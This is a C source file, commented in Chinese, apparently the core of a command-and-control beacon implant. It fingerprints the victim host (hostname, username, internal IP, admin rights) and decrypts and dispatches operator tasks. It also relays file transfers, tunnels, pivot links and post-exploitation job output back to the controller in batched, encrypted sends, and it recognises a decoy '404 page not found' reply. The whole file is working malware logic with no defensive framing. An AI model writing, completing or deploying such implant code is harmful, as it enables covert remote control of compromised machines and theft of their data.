#include "beacon_agent_internal.h"

/* 构建元数据载荷 */
ByteBuf AgentBuildMetadataPayload(const BeaconContext* ctx)
{
    ByteBuf p;

    BbInit(&p);
    BbString(&p, ctx->meta.os);
    BbString(&p, ctx->meta.arch);
    BbString(&p, ctx->meta.hostname);
    BbString(&p, ctx->meta.username);
    BbString(&p, ctx->meta.internal_ip);
    BbString(&p, ctx->meta.process_name);
    BbU32(&p, ctx->meta.pid);
    BbU8(&p, (UINT8)(ctx->meta.is_admin ? 1 : 0));
    BbU32(&p, ctx->meta.acp);
    BbU32(&p, (UINT32)(ctx->profile.sleep_ms / 1000));
    BbU32(&p, (UINT32)ctx->profile.jitter);

    return p;
}

/* 构建明文心跳 */
ByteBuf AgentBuildHeartbeatPlain(const BeaconContext* ctx)
{
    ByteBuf meta = AgentBuildMetadataPayload(ctx);
    ByteBuf p = PacketPackHeartbeat(ctx->beacon_id, ctx->session_key, sizeof(ctx->session_key), &meta);

    BbFree(&meta);
    return p;
}

/* 检查响应体是否为默认的 404 内容 */
static INT AgentIsNotFoundBody(const ByteBuf* b)
{
    static const CHAR text[] = "404 page not found";
    return b->len == sizeof(text) - 1 && memcmp(b->data, text, b->len) == 0;
}

/* 解密并分发任务 */
VOID AgentDispatchTasks(BeaconContext* ctx, const ByteBuf* encrypted_tasks)
{
    ByteBuf plain;
    Parser outer;

    if (!encrypted_tasks->len || AgentIsNotFoundBody(encrypted_tasks)) {
        return;
    }

    if (!CryptoDecryptTask(ctx->session_key, sizeof(ctx->session_key), encrypted_tasks, &plain)) {
        return;
    }

    ParserInit(&outer, plain.data, plain.len);

    while (ParserLeft(&outer) > 0 && !outer.error[0]) {
        ByteBuf task_block = ParserBytes(&outer);
        Parser task;
        UINT32 task_id;
        UINT32 command_id;
        ByteBuf payload;
        PacketList results;
        SIZE_T i;

        if (outer.error[0]) {
            BbFree(&task_block);
            break;
        }

        ParserInit(&task, task_block.data, task_block.len);
        task_id = ParserU32(&task);
        command_id = ParserU32(&task);
        payload = ParserBytes(&task);

        if (task.error[0]) {
            ByteBuf e = BbFromText(task.error);
            ByteBuf f = PacketMakeFinal(task_id, command_id, &e);
            OutboxEnqueue(&ctx->outbox, f);
            BbFree(&e);
            BbFree(&task_block);
            BbFree(&payload);
            continue;
        }

        results = CommandDispatch(ctx, task_id, command_id, &payload);

        for (i = 0; i < results.count; ++i) {
            if (results.items_are_final) {
                ByteBuf moved = results.items[i];
                BbInit(&results.items[i]);
                OutboxEnqueue(&ctx->outbox, moved);
            } else {
                ByteBuf f = PacketMakeFinal(task_id, command_id, &results.items[i]);
                OutboxEnqueue(&ctx->outbox, f);
            }
        }

        if (results.should_exit) {
            ctx->active = 0;
        }

        PlistFree(&results);
        BbFree(&task_block);
        BbFree(&payload);
    }

    BbFree(&plain);
}

/* 轮询文件传输结果 */
VOID AgentFlushTransfers(BeaconContext* ctx)
{
    PacketList out = TransferPoll(ctx);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 轮询隧道数据 */
VOID AgentFlushTunnels(BeaconContext* ctx)
{
    PacketList out = TunnelPoll(&ctx->tunnels);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 同 tick 收割：短暂等待 worker 入队后再排空，避免响应落到下一轮 sleep */
VOID AgentHarvestTunnels(BeaconContext* ctx)
{
    TunnelHarvestWait(&ctx->tunnels);
    AgentFlushTunnels(ctx);
}

/* 轮询级联子链路数据 */
VOID AgentFlushCascade(BeaconContext* ctx)
{
    PacketList out = CascadePoll(&ctx->cascade);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/* 轮询外部 post-ex pipe job 输出 */
VOID AgentFlushPostEx(BeaconContext* ctx)
{
    PacketList out = PostExPoll(&ctx->postex);
    SIZE_T i;

    for (i = 0; i < out.count; ++i) {
        ByteBuf moved = out.items[i];
        BbInit(&out.items[i]);
        OutboxEnqueue(&ctx->outbox, moved);
    }

    PlistFree(&out);
}

/*
 * 统一的 outbox flush 骨架（批量版）。
 * drain → 拼接所有包成一个明文 buffer → 一次加密 → 一次发送 → 一次分发响应 → free。
 *
 * 批量化的动机：tunnel/transfer 等高频回传场景下，单 tick 可能产生几十到上百个
 * outbox 包。旧的逐包循环每包都要一次独立 HTTP/TCP 往返和一次 AES-GCM 加密，
 * 主循环被串行网络往返彻底阻塞。批量化后 N 个包只走 1 次网络往返和 1 次加密。
 *
 * 协议兼容：拼接后的明文 = 多个 PacketMakeFinal 长度前缀块顺序拼接，与 server 端
 * ProcessDecryptedBeaconData 的 for(p.Size()>0){ ParseBytes } 循环消费模型一致，
 * server 端 DecryptResult/ProcessDecryptedBeaconData 无需任何改动。
 *
 * 失败语义：拼接/加密/发送任一步失败，整批 list 经 OutboxPushFrontList 回塞 outbox
 * 头部，下个 tick 重试整批，不丢包。send 成功后才释放整批节点。
 * send 回调签名约定：
 *   - 输入 encrypted 为本 tick 全部 outbox 包拼接后一次性加密的密文
 *   - 输出 response 为本次发送收到的任务密文（可为空）
 *   - 返回 1 成功，0 失败
 * ctx_sender 是回调上下文（heartbeat / session / upstream 等）。
 */
INT AgentFlushOutbox(BeaconContext* ctx, OutboxSendFn send, VOID* ctx_sender)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur;
    OutboxNode* next;
    ByteBuf plain;
    ByteBuf encrypted;
    ByteBuf response;

    if (!list) {
        return 1;  /* 空队列，直接成功，不发空请求 */
    }

    /* 1. 把所有 outbox 包拼接成一个明文 buffer */
    BbInit(&plain);
    cur = list;
    while (cur) {
        if (!BbAppend(&plain, cur->packet.data, cur->packet.len)) {
            BbFree(&plain);
            OutboxPushFrontList(&ctx->outbox, list);  /* 拼接失败，整批回塞 */
            return 0;
        }
        cur = cur->next;
    }

    /* 2. 一次加密所有包 */
    if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &plain, &encrypted)) {
        BbFree(&plain);
        OutboxPushFrontList(&ctx->outbox, list);  /* 加密失败，整批回塞 */
        return 0;
    }
    BbFree(&plain);

    /* 3. 一次发送 */
    BbInit(&response);
    if (!send(ctx, ctx_sender, &encrypted, &response)) {
        BbFree(&encrypted);
        BbFree(&response);
        OutboxPushFrontList(&ctx->outbox, list);  /* 发送失败，整批回塞 */
        return 0;
    }
    BbFree(&encrypted);

    /* 4. 发送成功后才释放整批节点 */
    cur = list;
    while (cur) {
        next = cur->next;
        OutboxFreeNode(cur);
        cur = next;
    }

    /* 5. dispatch 响应里的任务（一次），再排空隧道（不等待，不新开 C2 往返） */
    AgentDispatchTasks(ctx, &response);
    AgentFlushTunnels(ctx);
    BbFree(&response);
    return 1;
}
